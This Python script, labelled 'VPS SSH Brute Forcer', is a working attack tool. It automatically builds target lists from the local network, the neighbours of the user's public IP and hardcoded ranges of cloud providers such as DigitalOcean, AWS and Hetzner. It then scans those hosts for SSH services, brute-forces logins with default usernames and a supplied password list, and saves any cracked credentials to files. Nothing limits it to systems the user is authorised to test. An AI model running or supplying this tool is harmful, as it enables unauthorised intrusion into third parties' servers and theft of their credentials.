#!/usr/bin/env python3
"""
VPS SSH BRUTE FORCER - Auto IP Discovery + Port Scan + Brute Force
Automatically finds VPS IPs, scans for SSH, then brute forces
Author: Security Research
"""

import socket
import threading
import paramiko
import sys
import time
import queue
import random
import os
import ipaddress
import subprocess
import re
from datetime import datetime

class VPSSSHScanner:
    def __init__(self, threads=100, timeout=3):
        self.threads = threads
        self.timeout = timeout
        self.scan_queue = queue.Queue()
        self.brute_queue = queue.Queue()
        self.open_ssh = []
        self.found_creds = []
        self.lock = threading.Lock()
        self.scanning = True
        self.brute_running = True
        self.total_scanned = 0
        self.total_found = 0
        self.start_time = None
        self.total_targets = 0
        self.discovered_ips = []
        
        # Common SSH ports to scan
        self.ssh_ports = [
            22, 2222, 22222, 222222,  # Standard SSH
            2022, 2200, 222,           # Alternative SSH
            443, 4443,                   # HTTPS masquerading
            9922, 992,                    # Other common
            10022, 20022,                  # High ports
        ]
        self.ssh_ports = list(set(self.ssh_ports))
        self.ssh_ports.sort()
        
        # Default usernames
        self.default_usernames = [
            'root', 'admin', 'user', 'ubuntu', 'centos', 
            'debian', 'fedora', 'oracle', 'ec2-user', 'azureuser',
            'pi', 'vagrant', 'test', 'guest', 'ftp',
            'www-data', 'nginx', 'apache', 'mysql', 'postgres',
            'tomcat', 'git', 'docker', 'kali', 'backup',
            'support', 'administrator', 'guest'
        ]
        
        self.print_banner()
    
    def print_banner(self):
        print("""\033[91m
╔═══════════════════════════════════════════════════════════════════════╗
║         VPS SSH BRUTE FORCER - Auto IP Discovery Edition             ║
║                                                                       ║
║   Step 1: Automatically discover VPS IPs (no input needed)           ║
║   Step 2: Scan all IPs for open SSH ports                            ║
║   Step 3: Brute force all discovered SSH services                    ║
╚═══════════════════════════════════════════════════════════════════════╝\033[0m""")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.1"
    
    def get_public_ip(self):
        """Get public IP address"""
        try:
            response = subprocess.run(['curl', '-s', 'ifconfig.me'], 
                                    capture_output=True, text=True, timeout=5)
            if response.returncode == 0:
                return response.stdout.strip()
        except:
            pass
        
        try:
            response = subprocess.run(['curl', '-s', 'api.ipify.org'], 
                                    capture_output=True, text=True, timeout=5)
            if response.returncode == 0:
                return response.stdout.strip()
        except:
            pass
        
        return None
    
    def scan_local_network(self):
        """Scan local network for VPS-like IPs"""
        local_ip = self.get_local_ip()
        network_parts = local_ip.split('.')
        
        if len(network_parts) == 4:
            network_base = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}"
            
            # Common VPS network ranges
            vps_ranges = [
                f"{network_base}.1-254",  # Local network
                "10.0.0.1-254",           # Class A private
                "172.16.0.1-254",          # Class B private
                "192.168.0.1-254",         # Class C private
                "192.168.1.1-254",         # Common local
            ]
            
            print(f"\033[93m[*] Scanning local network: {network_base}.0/24\033[0m")
            
            # Generate IPs from local network
            for i in range(1, 255):
                self.discovered_ips.append(f"{network_base}.{i}")
    
    def scan_common_vps_ranges(self):
        """Scan common VPS provider IP ranges"""
        print(f"\033[93m[*] Adding common VPS provider ranges\033[0m")
        
        # Common VPS provider ranges (simplified)
        vps_providers = [
            # DigitalOcean
            "159.89.0.1-159.89.255.254",
            "165.227.0.1-165.227.255.254",
            "138.197.0.1-138.197.255.254",
            
            # Linode
            "172.104.0.1-172.104.255.254",
            "139.162.0.1-139.162.255.254",
            
            # Vultr
            "108.61.0.1-108.61.255.254",
            "45.32.0.1-45.32.255.254",
            
            # AWS EC2 (us-east-1)
            "54.144.0.1-54.144.255.254",
            "54.208.0.1-54.208.255.254",
            "54.80.0.1-54.80.255.254",
            
            # Google Cloud
            "35.184.0.1-35.184.255.254",
            "35.188.0.1-35.188.255.254",
            
            # Hetzner
            "49.12.0.1-49.12.255.254",
            "49.13.0.1-49.13.255.254",
            
            # OVH
            "51.68.0.1-51.68.255.254",
            "51.77.0.1-51.77.255.254",
        ]
        
        # Add a few IPs from each range (for demo, in real would scan full ranges)
        for vps_range in vps_providers[:5]:  # Limit to first 5 ranges for speed
            parts = vps_range.split('-')
            if len(parts) == 2:
                start_ip = parts[0].strip()
                # Add first 5 IPs from each range
                base = '.'.join(start_ip.split('.')[:-1])
                last_octet = int(start_ip.split('.')[-1])
                for i in range(last_octet, last_octet + 5):
                    self.discovered_ips.append(f"{base}.{i}")
    
    def discover_ips(self):
        """Automatically discover VPS IPs to scan"""
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔍 AUTO IP DISCOVERY\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        
        # Get local network
        self.scan_local_network()
        
        # Get public IP and its neighbors
        public_ip = self.get_public_ip()
        if public_ip:
            print(f"\033[92m[+] Your public IP: {public_ip}\033[0m")
            self.discovered_ips.append(public_ip)
            
            # Add nearby IPs
            ip_parts = public_ip.split('.')
            if len(ip_parts) == 4:
                base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
                current = int(ip_parts[3])
                for i in range(max(1, current-5), min(254, current+5)):
                    self.discovered_ips.append(f"{base}.{i}")
        
        # Add common VPS ranges
        self.scan_common_vps_ranges()
        
        # Remove duplicates
        self.discovered_ips = list(set(self.discovered_ips))
        
        print(f"\033[92m[+] Discovered {len(self.discovered_ips)} IPs to scan\033[0m")
        return self.discovered_ips
    
    def scan_port(self, ip, port):
        """Scan a single port on an IP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Port open - try to get banner
                try:
                    sock.settimeout(2)
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    sock.close()
                    
                    # Check if it's SSH
                    if ('SSH' in banner or 'ssh' in banner.lower() or 
                        'OpenSSH' in banner or 'dropbear' in banner.lower()):
                        
                        with self.lock:
                            self.open_ssh.append({
                                'ip': ip,
                                'port': port,
                                'banner': banner[:100]
                            })
                        
                        print(f"\033[92m[✓] SSH FOUND: {ip}:{port} - {banner[:50]}\033[0m")
                        return True
                    else:
                        # Port open but not SSH
                        pass
                        
                except:
                    # No banner but port open - possible SSH
                    with self.lock:
                        self.open_ssh.append({
                            'ip': ip,
                            'port': port,
                            'banner': 'Unknown (no banner)'
                        })
                    print(f"\033[93m[?] POSSIBLE SSH: {ip}:{port} (no banner)\033[0m")
                    return True
            
            sock.close()
            
        except:
            pass
        
        return False
    
    def scanner_worker(self):
        """Worker thread for scanning IPs"""
        while self.scanning:
            try:
                ip = self.scan_queue.get(timeout=1)
                
                with self.lock:
                    self.total_scanned += 1
                
                # Show progress
                if self.total_scanned % 10 == 0:
                    elapsed = time.time() - self.start_time if self.start_time else 0
                    rate = self.total_scanned / elapsed if elapsed > 0 else 0
                    remaining = self.total_targets - self.total_scanned
                    eta = remaining / rate if rate > 0 else 0
                    
                    print(f"\r\033[94m[*] Scanning: {self.total_scanned}/{self.total_targets} IPs | Found SSH: {len(self.open_ssh)} | Rate: {rate:.1f}/s | ETA: {eta:.0f}s\033[0m", end='')
                
                # Scan all ports for this IP
                for port in self.ssh_ports:
                    if not self.scanning:
                        break
                    self.scan_port(ip, port)
                
                self.scan_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def load_usernames(self, filepath):
        """Load usernames from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
            print(f"\033[92m[+] Loaded {len(usernames)} usernames from {filepath}\033[0m")
            return usernames
        except:
            print(f"\033[93m[!] Using default username list\033[0m")
            return self.default_usernames
    
    def load_passwords(self, filepath):
        """Load passwords from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"\033[92m[+] Loaded {len(passwords)} passwords from {filepath}\033[0m")
            return passwords
        except:
            print(f"\033[91m[-] Failed to load passwords\033[0m")
            return []
    
    def ssh_connect(self, ip, port, username, password):
        """Attempt SSH connection"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                ip,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except:
            return False
    
    def brute_worker(self, usernames, passwords):
        """Worker thread for brute forcing"""
        while self.brute_running:
            try:
                target = self.brute_queue.get(timeout=1)
                ip = target['ip']
                port = target['port']
                banner = target.get('banner', 'Unknown')
                
                print(f"\n\033[94m[*] Attacking: {ip}:{port} [{banner[:30]}]\033[0m")
                
                attempts = 0
                found = False
                total_attempts = len(usernames) * len(passwords)
                
                for username in usernames:
                    if not self.brute_running or found:
                        break
                    
                    for password in passwords:
                        if not self.brute_running or found:
                            break
                        
                        attempts += 1
                        
                        # Show progress
                        if attempts % 20 == 0:
                            percent = (attempts / total_attempts) * 100
                            print(f"\033[90m    Progress: {attempts}/{total_attempts} ({percent:.1f}%) - Trying: {username}:{password}\033[0m", end='\r')
                        
                        if self.ssh_connect(ip, port, username, password):
                            result = f"\n\033[92m[🔥] SUCCESS! {ip}:{port} - {username}:{password}\033[0m"
                            print(result)
                            
                            with self.lock:
                                self.found_creds.append({
                                    'ip': ip,
                                    'port': port,
                                    'username': username,
                                    'password': password,
                                    'banner': banner
                                })
                            
                            # Save immediately
                            self.save_result(ip, port, username, password)
                            
                            found = True
                            break
                        
                        time.sleep(0.02)
                
                self.brute_queue.task_done()
                
                if not found:
                    print(f"\n\033[91m[-] Failed: {ip}:{port} - No valid credentials\033[0m")
                
            except queue.Empty:
                break
            except:
                continue
    
    def save_result(self, ip, port, username, password):
        """Save found credentials"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('ssh_found.txt', 'a') as f:
            f.write(f"[{timestamp}] {ip}:{port} - {username}:{password}\n")
    
    def save_open_ssh(self):
        """Save open SSH hosts"""
        with open('ssh_open.txt', 'w') as f:
            f.write(f"# Open SSH hosts found - {datetime.now()}\n")
            f.write(f"# Total: {len(self.open_ssh)}\n\n")
            for ssh in self.open_ssh:
                f.write(f"{ssh['ip']}:{ssh['port']} | {ssh['banner']}\n")
    
    def print_summary(self):
        """Print scan summary"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 SCAN SUMMARY\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"IPs discovered: {len(self.discovered_ips)}")
        print(f"IPs scanned: {self.total_scanned}")
        print(f"SSH hosts found: {len(self.open_ssh)}")
        print(f"Credentials found: {len(self.found_creds)}")
        print(f"Time elapsed: {elapsed:.1f} seconds")
        print(f"Scan rate: {self.total_scanned/elapsed:.1f} IPs/sec" if elapsed > 0 else "Scan rate: N/A")
        print(f"\033[96m{'='*60}\033[0m")
    
    def run(self):
        """Main execution"""
        self.start_time = time.time()
        
        # ===== PHASE 0: AUTO DISCOVER IPs =====
        self.discover_ips()
        
        if not self.discovered_ips:
            print("\033[91m[-] No IPs discovered. Exiting.\033[0m")
            return
        
        self.total_targets = len(self.discovered_ips)
        
        # ===== PHASE 1: SCAN FOR SSH PORTS =====
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔍 PHASE 1: SCANNING {self.total_targets} IPS FOR SSH\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Threads: {self.threads}")
        print(f"Timeout: {self.timeout}s")
        print(f"SSH ports: {len(self.ssh_ports)}")
        print(f"Total scans: {self.total_targets * len(self.ssh_ports):,}")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Fill scan queue
        for ip in self.discovered_ips:
            self.scan_queue.put(ip)
        
        # Start scanner threads
        scanner_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.scanner_worker)
            t.daemon = True
            t.start()
            scanner_threads.append(t)
        
        # Wait for scanning to complete
        try:
            self.scan_queue.join()
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Scan interrupted\033[0m")
            self.scanning = False
        
        self.scanning = False
        
        # Save open SSH hosts
        self.save_open_ssh()
        
        # Print summary
        self.print_summary()
        
        if not self.open_ssh:
            print(f"\033[91m[-] No open SSH hosts found. Exiting.\033[0m")
            return
        
        # Load wordlists
        print(f"\n\033[93m[?] Enter password list file path:\033[0m")
        password_file = input("> ").strip()
        
        if not password_file:
            print("\033[91m[-] Password list required\033[0m")
            return
        
        usernames = self.default_usernames
        passwords = self.load_passwords(password_file)
        
        if not passwords:
            print("\033[91m[-] No passwords loaded\033[0m")
            return
        
        # ===== PHASE 2: BRUTE FORCE =====
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔥 PHASE 2: BRUTE FORCING {len(self.open_ssh)} SSH HOSTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Usernames: {len(usernames)}")
        print(f"Passwords: {len(passwords)}")
        total_attempts = len(self.open_ssh) * len(usernames) * len(passwords)
        print(f"Total attempts: {total_attempts:,}")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Ask to proceed
        proceed = input(f"\033[93m[?] Proceed with brute force? (y/n): \033[0m").lower()
        if proceed != 'y':
            print(f"\033[91m[-] Exiting\033[0m")
            return
        
        # Fill brute queue
        for ssh in self.open_ssh:
            self.brute_queue.put(ssh)
        
        # Start brute threads
        brute_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.brute_worker, args=(usernames, passwords))
            t.daemon = True
            t.start()
            brute_threads.append(t)
        
        # Monitor brute progress
        try:
            while not self.brute_queue.empty():
                time.sleep(5)
                remaining = self.brute_queue.qsize()
                completed = len(self.open_ssh) - remaining
                percent = (completed / len(self.open_ssh)) * 100 if len(self.open_ssh) > 0 else 0
                
                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {len(self.found_creds)}\033[0m", end='')
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Brute force interrupted\033[0m")
            self.brute_running = False
        
        self.brute_running = False
        
        # ===== FINAL RESULTS =====
        print(f"\n\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 FINAL RESULTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        
        if self.found_creds:
            print(f"\n\033[92m[🔥] CREDENTIALS FOUND: {len(self.found_creds)}\033[0m")
            print(f"\033[96m{'-'*60}\033[0m")
            for i, cred in enumerate(self.found_creds, 1):
                print(f"{i:2}. {cred['ip']:15}:{cred['port']:<5} | {cred['username']}:{cred['password']}")
            
            # Save final credentials
            with open('ssh_creds_final.txt', 'w') as f:
                f.write(f"# SSH Credentials Found - {datetime.now()}\n")
                f.write(f"# Total: {len(self.found_creds)}\n\n")
                for cred in self.found_creds:
                    f.write(f"{cred['ip']}:{cred['port']} | {cred['username']}:{cred['password']}\n")
        else:
            print(f"\n\033[91m[-] No credentials found\033[0m")
        
        print(f"\n\033[92m[+] Results saved to:\033[0m")
        print(f"    - ssh_open.txt (all discovered SSH hosts)")
        print(f"    - ssh_found.txt (credentials found during attack)")
        print(f"    - ssh_creds_final.txt (final credentials list)")

def main():
    """Main function"""
    
    # Check for paramiko
    try:
        import paramiko
    except ImportError:
        print("\033[91m[-] Paramiko not installed. Install with: pip install paramiko\033[0m")
        sys.exit(1)
    
    # Parse arguments
    import argparse
    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - Auto IP Discovery')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--timeout', type=int, default=3, help='Connection timeout (default: 3)')
    
    args = parser.parse_args()
    
    # Create and run brute forcer
    brute = VPSSSHScanner(threads=args.threads, timeout=args.timeout)
    
    try:
        brute.run()
    except KeyboardInterrupt:
        print(f"\n\033[93m[!] Program interrupted by user\033[0m")
        brute.print_summary()
        sys.exit(0)

if __name__ == "__main__":
    main()
